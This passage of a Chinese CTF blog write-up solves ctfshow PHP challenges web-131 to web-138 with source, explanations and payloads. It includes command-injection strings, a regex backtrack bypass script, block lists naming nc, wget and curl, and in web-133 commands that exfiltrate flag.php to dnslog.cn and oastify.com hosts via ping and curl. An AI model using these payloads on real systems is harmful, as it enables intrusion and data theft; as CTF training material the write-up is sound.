invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;36Dctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>这里将我们传的f的值进行了强制类型转换，转成了字符串类型，导致无法绕过stripos，这里只能用PCRE回溯次数绕过。</strong></p><p>python脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br><span class="hljs-attribute">url</span>=<span class="hljs-string">&#x27;http://ced5ea6a-1d3b-4f66-a3ff-61a42deeaec4.challenge.ctf.show:8080/&#x27;</span><br>data=&#123;<br>    <span class="hljs-string">&#x27;f&#x27;</span>:<span class="hljs-string">&#x27;show&#x27;</span><span class="hljs-number">*250002</span>+<span class="hljs-string">&#x27;36Dctfshow&#x27;</span><br>&#125;<br><span class="hljs-attribute">r</span>=requests.post(url=url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><hr><h3 id="PCRE回溯次数绕过"><a href="#PCRE回溯次数绕过" class="headerlink" title="PCRE回溯次数绕过"></a>PCRE回溯次数绕过</h3><p>1.正则最大回溯次数绕过<br> PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br> 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;&quot;</span><br>data=&#123;<span class="hljs-string">&#x27;f&#x27;</span>:<span class="hljs-string">&#x27;very&#x27;</span>*<span class="hljs-number">250000</span>+<span class="hljs-string">&#x27;ctfshow&#x27;</span> &#125; r=requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><hr><h2 id="web-132（逻辑运算符优先级）"><a href="#web-132（逻辑运算符优先级）" class="headerlink" title="web-132（逻辑运算符优先级）"></a>web-132（逻辑运算符优先级）</h2><p>这题要先访问robots.txt，然后访问admin才能看到源码</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$code</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> === <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x36D</span>) &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-variable">$flag</span> || <span class="hljs-variable">$username</span> ===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> == <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：<br><code>if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</code></p><p><strong>当&amp;&amp;和||同时存在时，会从左往右进行运算，</strong></p><p><strong>x || y 或   如果 x 和 y 至少有一个为 true，则返回 true</strong> </p><p><strong>所以只要保证$username&#x3D;&#x3D;&#x3D;’admin’为true即可，</strong></p><p><strong>mt_rand — 生成更好的随机数</strong></p><p>payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=&amp;code=<span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-133（curl、无回显的shell-exec命令执行、DNSlog外带）"><a href="#web-133（curl、无回显的shell-exec命令执行、DNSlog外带）" class="headerlink" title="web-133（curl、无回显的shell_exec命令执行、DNSlog外带）"></a>web-133（curl、无回显的shell_exec<strong>命令执行</strong>、DNSlog外带）</h2><p>源码：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br><span class="hljs-comment">//flag.php</span><br><span class="hljs-built_in">if</span>($F = @$_GET[&#x27;F&#x27;])&#123;<br>    <span class="hljs-built_in">if</span>(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;<br>        <span class="hljs-built_in">eval</span>(substr($F,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>));<br>    &#125;else&#123;<br>        <span class="hljs-built_in">die</span>(&quot;<span class="hljs-number">6</span>个字母都还不够呀?!&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：<br><strong>源码过滤了很多命令执行的函数，但是这里还可以使用 无回显的shell_exec命令执行</strong></p><p><strong>然后还使用了substr截取我们传入的命令索引值为0-5的字符</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">get传参F=<span class="hljs-string">`$F `</span>;<span class="hljs-keyword">sleep</span> <span class="hljs-number">3</span><br>经过<span class="hljs-keyword">substr</span>(<span class="hljs-variable">$F</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)截取后 得到 <span class="hljs-string">`F `</span>;<br>我们把原来的<span class="hljs-variable">$F</span>带进去<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;``<span class="hljs-variable">$F</span> `;sleep 3`&quot;</span>);<br>所以也就是说最终会执行<span class="hljs-string">`   `</span><span class="hljs-variable">$F</span> <span class="hljs-string">`;sleep 3  `</span> == shell_exec(<span class="hljs-string">&quot;`<span class="hljs-variable">$F</span> `;sleep 3&quot;</span>);<br>前面的命令不需要管，后面的命令就随我们自由控制了<br>所以服务器上就成功执行了<span class="hljs-keyword">sleep</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>payload：</p><p><strong><a href="ceye.io">dnslog外带平台</a></strong></p><p><strong>用dnslog获得子域</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">?F=`<span class="hljs-variable">$F</span> `;ping `<span class="hljs-built_in">cat</span> flag.php | grep ctfshow | <span class="hljs-built_in">tr</span> -<span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;[a-z]&quot;</span>/<span class="hljs-string">&quot;[0-9]&quot;</span>`.krmij5.dnslog.cn -c 1<br><br>// -c: 设置完成要求回应的次数<br>// grep ctfshow: 打印匹配ctfhsow的行<br>// <span class="hljs-built_in">tr</span> -<span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;[a-z]&quot;</span>：只保留a-z<br></code></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-operator">-F</span><br>&gt;&gt;<span class="hljs-operator">-F</span>参数用来向服务器上传二进制文件<br><br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&#x27;file=@photo.png&#x27;</span> https://google.com/profile<br><br>上面命令会给 HTTP 请求加上标头Content<span class="hljs-literal">-Type</span>: multipart/form<span class="hljs-literal">-data</span>，然后将文件photo.png作为file字段上传。<br><br>&gt;&gt;<span class="hljs-operator">-F</span>参数可以指定 MIME 类型。<br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&#x27;file=@photo.png;type=image/png&#x27;</span> https://google.com/profile<br><br>上面命令指定 MIME 类型为image/png，否则 <span class="hljs-built_in">curl</span> 会把 MIME 类型设为application/octet<span class="hljs-literal">-stream</span>。<br><br>&gt;&gt;<span class="hljs-operator">-F</span>参数也可以指定文件名。<br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&#x27;file=@photo.png;filename=me.png&#x27;</span> https://google.com/profile<br><br>上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。<br><br><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span><br><span class="hljs-literal">-X</span>参数指定 HTTP 请求的方法。<br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST https://www.example.com<br><br>上面命令对https://www.example.com发出 POST 请求。<br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">可以用curl -F 将flag文件上传到Burp的 Collaborator <span class="hljs-built_in">Client</span> （ Collaborator <span class="hljs-built_in">Client</span> 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#其中-F 为带文件的形式发送post请求</span><br><span class="hljs-comment">#xx是上传文件的name值，flag.php就是上传的文件 </span><br><br>payload：<br><span class="hljs-string">?F</span>=<span class="hljs-string">`$F`</span>;+curl -X <span class="hljs-variable constant_">POST</span> -F xx=<span class="hljs-variable">@flag</span>.php <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/（域名地址）</span><br></code></pre></td></tr></table></figure><p><strong>使用bp工具中的collaborator：</strong></p><p><img src="/../image/ctfshow-php%E7%89%B9%E6%80%A7-1.png"></p><p>先复制一个域名地址，然后get传入payload，传入之后轮询即可</p><p>payload：</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">?F=<span class="hljs-string">`$F`</span>;+curl -X POST -F xx=<span class="hljs-keyword">@flag</span>.php http:<span class="hljs-comment">//go87ficuwhpxdp8tzmkz9dsovf16p8dx.oastify.com</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-134（-SERVER-‘QUERY-STRING’-、parse-str、extract）"><a href="#web-134（-SERVER-‘QUERY-STRING’-、parse-str、extract）" class="headerlink" title="web-134（$_SERVER[‘QUERY_STRING’]、parse_str、extract）"></a>web-134（$_SERVER[‘QUERY_STRING’]、parse_str、extract）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonononono&quot;</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<span class="hljs-comment">//把get传入的变量解析成多个变量</span><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">//把$_POST数组导入到当前符号表</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> == <span class="hljs-string">&#x27;36d&#x27;</span> &amp;&amp; <span class="hljs-variable">$key2</span> == <span class="hljs-string">&#x27;36d&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>是获取get的参数以及值。</strong></p><p><strong><code>parse_str</code>：将字符串解析到变量中。</strong></p><p><strong><code>extract()</code>：从数组中将变量导入到当前的符号表(简单来说就是，将数组里的键给搞成变量，将数组的值给对应的键)。</strong></p><p>我们构造payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?_POST[key1]<span class="hljs-punctuation">=</span><span class="hljs-number">36</span>d<span class="hljs-meta">&amp;_POST[key2]=36d</span><br><span class="hljs-comment">//因为php文件不会直接显现出来，所以需要查看源代码</span><br></code></pre></td></tr></table></figure><p>首先<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取到get的参数和值，然后<code>parse_str</code>将<code>_POST[key1]=36d&amp;_POST[key2]=36d</code>转化为<code>$_POST</code>（数组），<code>extract</code>将<code>$_POST[key1]=36d、$_POST[key2]=36d</code>转化为<code>$key1=36d、$key2=36d</code></p><hr><h2 id="web-135（nl（linux））"><a href="#web-135（nl（linux））" class="headerlink" title="web-135（nl（linux））"></a>web-135（nl（linux））</h2><p>源码：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coq">error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(__FILE__);<br>//flag.php<br><span class="hljs-keyword">if</span>($F = @$_GET[&#x27;F&#x27;])&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(&#x27;/system|<span class="hljs-type">nc</span>|<span class="hljs-type">wget</span>|<span class="hljs-type">exec</span>|<span class="hljs-type">passthru</span>|<span class="hljs-type">bash</span>|<span class="hljs-type">sh</span>|<span class="hljs-type">netcat</span>|<span class="hljs-type">curl</span>|<span class="hljs-type">cat</span>|<span class="hljs-type">grep</span>|<span class="hljs-type">tac</span>|<span class="hljs-type">more</span>|<span class="hljs-type">od</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">tail</span>|<span class="hljs-type">less</span>|<span class="hljs-type">base64</span>|<span class="hljs-type">rev</span>|<span class="hljs-type">cut</span>|<span class="hljs-type">od</span>|<span class="hljs-type">strings</span>|<span class="hljs-type">tailf</span>|<span class="hljs-type">head</span>/i&#x27;, $F))&#123;<br>        eval(substr($F,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        die(<span class="hljs-string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>这题和133很像，但是把curl和很多命令都过滤掉了，但是还有一个nl可以用，绕过方法还是133题的方法。</strong></p><p><strong>ping没被过滤，dnslog外带应该也可以，但是我这里失败了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ;">?F=`$F`+;nl flag.php &gt; a//查看flag.php文件，再重定向到a文件中，访问url/a即可下载文件后查看<br>加文件后缀也可以<br>?F=`$F`+;nl flag.php &gt; a.txt//然后访问url/a.txt即可<br><br>cp好像也可以<br>F=`$F `;cp flag.php 1.txt//然后访问url/1.txt即可<br><br>另一种绕过payload<br>?F=`$F `;nl flag.php &gt; a<br></code></pre></td></tr></table></figure><hr><h2 id="web-136（tee、nl、exec-）"><a href="#web-136（tee、nl、exec-）" class="headerlink" title="web-136（tee、nl、exec()）"></a>web-136（tee、nl、exec()）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>题目过滤了很多命令，很明显，需要我们get传c的值，然后使用exec函数去命令执行，可以使用tee和nl来获取flag</strong></p><p><strong>tee可以用来实现将标准输入写入文件的功能，因为这里重定向符被过滤了所以只能用tee了</strong></p><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">首先使用<span class="hljs-built_in">ls</span>、管道输出符加<span class="hljs-built_in">tee</span>实现扫描当前目录并写入到文件1中的目的，注意不能用文件后缀，因为点被过滤了<br>?c=<span class="hljs-built_in">ls</span> / | <span class="hljs-built_in">tee</span> 1<br><br>然后url/1即可下载文件，然后打开发现一个f149_15_h3r3文件，猜测是flag，然后使用<span class="hljs-built_in">nl</span>或者<span class="hljs-built_in">cat</span>来读取flag并写入到文件2中<br>?c=<span class="hljs-built_in">nl</span> /f149_15_h3r3 | <span class="hljs-built_in">tee</span> 2<br>?c=<span class="hljs-built_in">cat</span> /f149_15_h3r3 | <span class="hljs-built_in">tee</span> 2<br></code></pre></td></tr></table></figure><hr><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p><strong><code>exec(string $command, array &amp;$output = ?, int &amp;$return_var = ?): string</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>() 执行 command 参数所指定的命令。<br>例：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出运行中的 php/httpd 进程的创建者用户名</span><br><span class="hljs-comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="tee（linux）"><a href="#tee（linux）" class="headerlink" title="tee（linux）"></a>tee（linux）</h3><p>tee命令是Linux中常用的命令。这是一个简单但功能强大的命令，用于读取标准输入，然后将其写入文件以及标准输出。</p><p>下是 tee 命令的一些最常用选项 -</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">-a, --<span class="hljs-built_in">append</span><br></code></pre></td></tr></table></figure><p>此选项将标准输入附加到指定文件的末尾而不是覆盖它们。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span>i, <span class="hljs-comment">--ignore-interrupts</span><br></code></pre></td></tr></table></figure><p>该选项忽略中断信号（如Ctrl+C）并继续运行。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span>p, <span class="hljs-comment">--output-error</span><br></code></pre></td></tr></table></figure><p>此选项可防止 tee 命令因写入错误而退出。</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">--<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>此选项显示 tee 命令的帮助消息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p>此选项显示 tee 命令的版本号。</p><p><strong>常用功能：</strong></p><p><strong>将标准输入写入文件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello,world!&quot;</span> | <span class="hljs-built_in">tee</span> hello.txt</span><br><br>这里是将语句写入到文件中<br></code></pre></td></tr></table></figure><p><strong>将标准输入附加到文件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello,world again!&quot;</span> | <span class="hljs-built_in">tee</span> -a hello.txt</span><br><br>将语句追加到文件中<br></code></pre></td></tr></table></figure><hr><h2 id="web-137（call-user-func调用类的静态方法）"><a href="#web-137（call-user-func调用类的静态方法）" class="headerlink" title="web-137（call_user_func调用类的静态方法）"></a>web-137（call_user_func调用类的静态方法）</h2><p>源码：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br>class ctfshow<br>&#123;<br>    function <span class="hljs-built_in">__wakeup</span>()&#123;<br>        <span class="hljs-built_in">die</span>(&quot;private class&quot;);<br>    &#125;<br>    static function <span class="hljs-built_in">getFlag</span>()&#123;<br>        echo <span class="hljs-built_in">file_get_contents</span>(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-built_in">call_user_func</span>($_POST[&#x27;ctfshow&#x27;]);<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>这题一看就知道要使用call_user_func回调函数来拿到flag，然后分析一下发现只要我们调用ctfshow类中的静态方法getFlag即可输出flag.php</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">post：<span class="hljs-attribute">ctfshow</span>=ctfshow::getFlag<br>然后查看源码即可得到flag<br></code></pre></td></tr></table></figure><h3 id="类的静态方法的调用"><a href="#类的静态方法的调用" class="headerlink" title="类的静态方法的调用"></a>类的静态方法的调用</h3><p><strong>语法：类+::+方法名</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">-&gt;与::调用函数的区别：<br>-&gt; 调用实例方法<br>:: 调用静态方法<br>在类里面的时候，<span class="hljs-variable">$this</span>-&gt;func()和self::func()没什么区别。<br>在外部的时候，-&gt;必须是实例化后的对象使用；而::可以是未实例化的类名直接调用。<br></code></pre></td></tr></table></figure><hr><h2 id="web-138（call-user-func数组调用静态方法）"><a href="#web-138（call-user-func数组调用静态方法）" class="headerlink" title="web-138（call_user_func数组调用静态方法）"></a>web-138（call_user_func数组调用静态方法）</h2><p>源码：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br>class ctfshow<br>&#123;<br>    function <span class="hljs-built_in">__wakeup</span>()&#123;<br>        <span 